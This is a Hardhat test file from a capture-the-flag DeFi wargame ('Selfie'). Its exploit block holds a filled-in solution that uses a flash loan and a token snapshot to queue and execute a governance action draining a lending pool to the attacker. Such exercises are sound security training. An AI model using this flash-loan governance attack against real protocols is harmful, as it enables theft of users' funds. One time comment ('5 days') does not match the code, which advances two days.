const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        //So the idea is to take a flashloan and queue an action to drain all the funds to the attacker address, will deploy
        //an attacker contract to pass the flashloan's checks.
        //The problem I ran into was that I needed to create a snapshot in the moment of receiving the funds. After
        //that it was easy to call the governance contract and queue the action to finally execute it 2 days after
        const dataForAction = this.pool.interface.encodeFunctionData("drainAllFunds(address)", [attacker.address]);
        const AttackSimpleGovernanceFactory = await ethers.getContractFactory('AttackSimpleGovernance', attacker);
        let attackerContract = await AttackSimpleGovernanceFactory.deploy(this.governance.address, this.pool.address, this.token.address);
        await attackerContract.attack(dataForAction, TOKENS_IN_POOL);
        let id = await attackerContract.actionIdAttacked();
        let attackGovernanceInstance = await this.governance.connect(attacker);
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
        await attackGovernanceInstance.executeAction(id);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
